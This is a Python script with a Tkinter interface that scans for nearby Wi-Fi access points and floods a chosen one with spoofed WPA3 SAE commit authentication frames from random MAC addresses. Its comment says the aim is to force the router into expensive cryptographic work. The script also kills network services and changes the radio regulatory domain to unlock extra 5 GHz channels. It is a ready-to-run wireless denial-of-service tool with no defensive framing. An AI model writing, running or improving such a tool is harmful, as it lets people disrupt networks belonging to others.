import os, sys, time, threading, random, subprocess
from scapy.all import *
import tkinter as tk
from tkinter import ttk

class SAEFlooderSurgical:
    def __init__(self, iface):
        self.iface = iface
        self.discovered_aps = {} # BSSID: {SSID, CH, Signal}
        self.running = True
        self.flooding = False
        self.current_ch = 1
        
        # Hardware Setup
        self.lock_hardware()
        self.allowed_channels = self.get_allowed_channels()
        
        # UI
        self.root = tk.Tk()
        self.root.title("SAE Commit Flooder & Multi-Band Scanner")
        self.root.geometry("900x600")
        self.root.configure(bg="#0a0a0a")

        # Table
        self.tree = ttk.Treeview(self.root, columns=("SSID", "BSSID", "CH", "Signal"), show="headings")
        for col in ("SSID", "BSSID", "CH", "Signal"): self.tree.heading(col, text=col)
        self.tree.pack(fill="both", expand=True, padx=20, pady=20)

        # Buttons
        btn_frame = tk.Frame(self.root, bg="#0a0a0a")
        btn_frame.pack(pady=10)
        
        self.flood_btn = tk.Button(btn_frame, text="START SAE FLOOD", bg="#aa0000", fg="white", 
                                   command=self.toggle_flood, font=("Arial", 10, "bold"))
        self.flood_btn.pack(side="left", padx=10)
        
        tk.Button(btn_frame, text="REPAIR & EXIT", bg="#333", fg="#ff4444", command=self.shutdown).pack(side="left")

        # Background Ops
        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner, daemon=True).start()

    def lock_hardware(self):
        os.system("sudo iw reg set PH") # Unlock local 5GHz
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type monitor && sudo ip link set {self.iface} up")

    def get_allowed_channels(self):
        """Logic: Query the driver to support all 2.4G and 5G channels available."""
        try:
            cmd = f"iwlist {self.iface} freq"
            output = subprocess.check_output(cmd, shell=True).decode()
            return [int(line.split("Channel ")[1].split(":")[0]) for line in output.split("\n") if "Channel " in line]
        except:
            return [1, 6, 11] # Fallback

    def hopper(self):
        i = 0
        while self.running:
            if not self.flooding:
                self.current_ch = self.allowed_channels[i]
                os.system(f"sudo iw dev {self.iface} set channel {self.current_ch}")
                i = (i + 1) % len(self.allowed_channels)
                time.sleep(1.5)
            else: time.sleep(1)

    def scanner(self):
        def callback(pkt):
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt.addr3
                ssid = pkt.info.decode(errors='ignore') or "Hidden"
                stats = pkt.getlayer(Dot11Beacon).network_stats()
                # We specifically look for WPA3 (SAE) or RSN tags
                if bssid not in self.discovered_aps:
                    self.discovered_aps[bssid] = {"SSID": ssid, "CH": self.current_ch, "Sig": pkt.dBm_AntSignal}
                    self.update_ui()

        sniff(iface=self.iface, prn=callback, store=0)

    def update_ui(self):
        for i in self.tree.get_children(): self.tree.delete(i)
        for bssid, info in self.discovered_aps.items():
            self.tree.insert("", "end", values=(info["SSID"], bssid, info["CH"], info["Sig"]))

    def toggle_flood(self):
        if not self.flooding:
            sel = self.tree.selection()
            if not sel: return
            target = self.tree.item(sel[0])["values"] # SSID, BSSID, CH
            self.flooding = True
            self.flood_btn.config(text="STOP FLOODING", bg="#555")
            threading.Thread(target=self.flood_logic, args=(target,), daemon=True).start()
        else:
            self.flooding = False
            self.flood_btn.config(text="START SAE FLOOD", bg="#aa0000")

    def flood_logic(self, target):
        ssid, bssid, ch = target[0], target[1], target[2]
        os.system(f"sudo iw dev {self.iface} set channel {ch}")
        
        while self.flooding:
            client = RandMAC()
            # SAE Commit Frame: Force the router to do expensive ECC math 
            pkt = (RadioTap() / 
                   Dot11(addr1=bssid, addr2=client, addr3=bssid) / 
                   Dot11Auth(algo=3, seqnum=1, status=0) / 
                   Dot11Elt(ID=19, info=b"\x13\x00") / 
                   Raw(load=b"\x01\x02\x03\x04" * 4))
            sendp(pkt, iface=self.iface, count=20, inter=0.005, verbose=False)

    def shutdown(self):
        self.running = False; self.flooding = False
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up")
        self.root.destroy()

if __name__ == "__main__":
    SAEFlooderSurgical(sys.argv[1]).root.mainloop()
